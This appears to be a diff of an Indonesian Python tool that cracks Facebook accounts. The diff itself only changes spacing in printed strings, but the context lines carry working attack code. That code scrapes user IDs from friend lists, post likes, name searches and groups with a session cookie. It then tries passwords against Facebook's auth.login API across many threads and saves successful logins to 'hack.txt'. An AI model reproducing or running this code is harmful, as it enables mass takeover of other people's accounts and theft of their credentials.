@@ -25,9 +25,9 @@ def baner():
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m────────────────────────────────────────────────────
-\x1b[1;97m[\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
-\x1b[1;97m[\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Yayan-XD
-\x1b[1;97m[\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
+\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Yayan-XD
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def balik():
@@ -38,14 +38,14 @@ def balik():
        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97] \033[1;91mSelamat Tinggal :')")
 def moch_yayan():
     time.sleep(0.1)
-    print("\033[00m[\033[96m01\033[00m] Mulai Cr4ck ID")
-    print("\033[00m[\033[96m02\033[00m] Turtor cara dapatkan cokies fb")
-    print("\033[00m[\033[96m03\033[00m] Update Tools")
-    print("\033[00m[\033[96m00\033[00m] Keluar")
+    print("\033[00m [\033[96m01\033[00m] Mulai Cr4ck ID")
+    print("\033[00m [\033[96m02\033[00m] Turtor cara dapatkan cokies fb")
+    print("\033[00m [\033[96m03\033[00m] Update Tools")
+    print("\033[00m [\033[96m00\033[00m] Keluar")
     print("\x1b[1;94m────────────────────────────────────────────────────")
     time.sleep(0.1)
 
-    yayan=input("\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
+    yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
     if yayan == "1" or yayan =="01":
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
@@ -105,7 +105,7 @@ def moch_yayan():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                       ",end="")
+                 print(f"\r\033[1;97m [\033[1;92m✓\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
@@ -114,7 +114,7 @@ def moch_yayan():
                         with open('hack.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;97m[\033[1;93m×\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                    ",end="")
+                   print(f"\r\033[1;97m [\033[1;93m×\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
@@ -125,7 +125,7 @@ def moch_yayan():
              else:
                    die += 1
              for i in list('\|/-•'):
-                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
+                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -137,7 +137,7 @@ def moch_yayan():
                         continue
                  else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[1;97m[\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mSedang Mengambil ID...",end="")
+                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mSedang Mengambil ID...",end="")
              if 'Lihat Teman Lain' in str(raw):
                  getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
              return id
@@ -148,7 +148,7 @@ def moch_yayan():
                   aws = getlike(mbasic.format(love))
                   return aws
              except:
-                  exit(" \033[1;97m[\033[1;94m•\033[1;97m] Cant Dump Id ")
+                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] Cant Dump Id ")
          def getlike(react):
              like = requests.get(react,cookies=kuki).content
              ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
@@ -157,7 +157,7 @@ def moch_yayan():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                 print(f'\r\033[1;97m[\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID...',end="")
+                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID...',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
              return id
@@ -169,7 +169,7 @@ def moch_yayan():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                   else:
                          id.append(user[1] + "|" + user[0].split("?")[0])
-                  print(f"\r\033[1;97m[\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97msedang mengambil ID...",end="")
+                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97msedang mengambil ID...",end="")
              if "Lihat Hasil Selanjutnya" in str(search):
                   bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
              return id
@@ -181,7 +181,7 @@ def moch_yayan():
                          id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0])
-                 print(f"\r\033[1;97m[\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID...",end="")
+                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID...",end="")
              if "Lihat Selengkapnya" in str(grab):
                  grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
              return id
@@ -192,18 +192,18 @@ def moch_yayan():
                    kuki = {'cookie':kukis}
                    clear()
                    baner()
-                   kata('\033[1;97m[\033[1;92m01\033[1;97m] \033[00mCrack Dari Teman')
-                   kata('\033[1;97m[\033[1;92m02\033[1;97m] \033[00mCrack Dari Link Post ')
-                   kata('\033[1;97m[\033[1;92m03\033[1;97m] \033[00mCrack Dari Pencarian Nama')
-                   kata('\033[1;97m[\033[1;92m04\033[1;97m] \033[00mCrack Dari Dari Grup')
-                   kata('\033[1;97m[\033[1;92m05\033[1;97m] \033[00mCrack Dari ID Publik ')
-                   kata('\033[1;97m[\033[1;92m06\033[1;97m] \033[00mLihat Hasil Crack')
-                   kata('\033[1;97m[\033[1;92m07\033[1;97m] \033[00mHapus Cookies')
-                   kata('\033[1;97m[\033[1;91m00\033[1;97m] \033[00mExit')
+                   kata('\033[1;97m [\033[1;92m01\033[1;97m] \033[00mCrack Dari Teman')
+                   kata('\033[1;97m [\033[1;92m02\033[1;97m] \033[00mCrack Dari Link Post ')
+                   kata('\033[1;97m [\033[1;92m03\033[1;97m] \033[00mCrack Dari Pencarian Nama')
+                   kata('\033[1;97m [\033[1;92m04\033[1;97m] \033[00mCrack Dari Dari Grup')
+                   kata('\033[1;97m [\033[1;92m05\033[1;97m] \033[00mCrack Dari ID Publik ')
+                   kata('\033[1;97m [\033[1;92m06\033[1;97m] \033[00mLihat Hasil Crack')
+                   kata('\033[1;97m [\033[1;92m07\033[1;97m] \033[00mHapus Cookies')
+                   kata('\033[1;97m [\033[1;91m00\033[1;97m] \033[00mExit')
                    kata('\x1b[1;94m────────────────────────────────────────────────────')
-                   memek = input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
+                   memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                    if memek =="":
-                         exit("\033[00m[\033[91m!\033[00m] Lihat Menu Dong")
+                         exit("\033[00m [\033[91m!\033[00m] Lihat Menu Dong")
                    elif memek == '0' or memek =='00':
                          kata("\n\033[1;92m Terimakasih Sudah Memakai Tools Saya\n Jangan lupa Subscribe My YouTube Channel...\n\n")
                          os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
@@ -227,7 +227,7 @@ def moch_yayan():
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
                    elif memek == '2' or memek =='02':
-                         username = input("\033[1;97m[\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
+                         username = input("\033[1;97m [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                          if username == "":
                                  exit("\033[00m[\033[91m!\033[00m] Link Post Lo Slh!")
                          elif 'www.facebook' in username:
@@ -236,18 +236,18 @@ def moch_yayan():
                                  username = username.replace('m.facebook.com','mbasic.facebook.com')
                          username = fromlikes(username)
                    elif memek == '3' or memek =='03':
-                         knf = input("\033[1;97m[\033[1;96m?\033[1;97m] Nama Yang Mau Anda Cari \033[1;91m: \033[1;92m")
+                         knf = input("\033[1;97m [\033[1;96m?\033[1;97m] Nama Yang Mau Anda Cari \033[1;91m: \033[1;92m")
                          username = bysearch(mbasic.format('/search/people/?q='+knf))
                          if len(username) == 0:
                                  exit("\033[90m[\033[91m!\033[90m] Tidak Ada Nama!")
                    elif memek == '4' or memek =='04':
-                         print("\033[1;97m[\033[1;94m•\033[1;97m] Hanya Bisa Mengambil \033[91m100 \033[00mID ")
+                         print("\033[1;97m [\033[1;94m•\033[1;97m] Hanya Bisa Mengambil \033[91m100 \033[00mID ")
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                          username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                          if len(username) == 0:
                                  exit("\033[00m[\033[91m!\033[00m] ID Grup Tidak ada!")
                    elif memek == '5' or memek =='05':
-                         knf = input("\033[1;97m[\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
+                         knf = input("\033[1;97m [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                          if knf.isdigit():
                                  user = "/profile.php?id=" + knf
                          else:
@@ -264,7 +264,7 @@ def moch_yayan():
                                  a = file1 + file2
                                  final = a.strip().split("\n")
                                  final = set(final)
-                                 print(f"\033[97m[\033[93m{str(len(final))}\033[97m] Akun Untuk Diperiksa ")
+                                 print(f"\033[97m [\033[93m{str(len(final))}\033[97m] Akun Untuk Diperiksa ")
                                  with ThreadPoolExecutor(max_workers=10) as ex:
                                          for user in final:
                                                  a = user.split("|")
@@ -285,9 +285,9 @@ def moch_yayan():
                    else:
                          exit("\033[00m[\033[91m!\033[00m] Lihat Menu Dong")
                    print()
-                   expass = input("\n\033[1;97m[\033[1;96m?\033[1;97m] Password Tambahan1 \033[1;91m: \033[1;92m")
-                   expass = input("\033[1;97m[\033[1;96m?\033[1;97m] Password Tambahan2 \033[1;91m: \033[1;92m")
-                   expass = input("\033[1;97m[\033[1;96m?\033[1;97m] Password Tambahan3 \033[1;91m: \033[1;92m")
+                   expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan1 \033[1;91m: \033[1;92m")
+                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan2 \033[1;91m: \033[1;92m")
+                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan3 \033[1;91m: \033[1;92m")
                    kata('\x1b[1;94m────────────────────────────────────────────────────\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
